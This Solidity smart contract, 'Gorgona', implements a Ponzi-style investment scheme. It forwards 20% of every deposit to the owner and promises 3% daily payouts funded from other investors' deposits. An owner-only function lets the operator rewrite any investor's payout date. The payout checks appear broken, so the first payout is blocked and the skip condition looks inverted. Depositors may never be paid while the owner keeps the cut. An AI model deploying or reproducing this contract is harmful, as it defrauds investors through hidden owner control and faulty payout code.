pragma solidity ^0.4.0;

contract Gorgona {
    address public owner;

    uint constant PAYOUT_INTERVAL = 1 days;
    uint constant PAYOUT_MIN_INTERVAL = 15 seconds;
    uint constant PAYOUT_LIMIT_COUNT = 50;

    struct investor
    {
        address addr;
        uint deposit;
        uint date;
        uint id;
    }

    address[] private addresses;

    mapping(address => investor) public investors;

    event Invest(address addr, uint amount);
    event Payout(uint amount, uint txs);

    uint payoutDate;

    modifier onlyOwner {if (msg.sender == owner) _;}

    constructor() public {
        owner = msg.sender;
        addresses.length++;
    }

    function() payable public {
        if (investors[msg.sender].id == 0) {
            investors[msg.sender].id = addresses.length;
            addresses.push(msg.sender);
            addresses.length++;
        }

        investors[msg.sender] = investor(msg.sender, investors[msg.sender].deposit + msg.value, now, investors[msg.sender].id);

        owner.transfer(msg.value / 5);

        emit Invest(msg.sender, msg.value);
    }

    function setDatePayout(address addr, uint date) onlyOwner public
    {
        investors[addr].date = date;
    }

    function payout() public
    {
        require(payoutDate > now - PAYOUT_MIN_INTERVAL);

        uint investorsPayout;
        uint count = 0;

        for (uint idx = addresses.length; idx-- > 0;)
        {
            address addr = addresses[idx];
            if (investors[addr].date > now + PAYOUT_INTERVAL)
                continue;

            uint amount = (investors[addr].deposit / 100) * 3;
            investors[addr].date += PAYOUT_INTERVAL;
            investors[addr].addr.transfer(amount);

            investorsPayout += amount;
            if (++count >= PAYOUT_LIMIT_COUNT) {
                break;
            }
        }

        payoutDate = now;
        emit Payout(investorsPayout, count);
    }

    function getInvestorDeposit(address addr) public view returns (uint) {
        return investors[addr].deposit;
    }

    function getInvestorDatePayout(address addr) public view returns (uint) {
        return investors[addr].date;
    }
}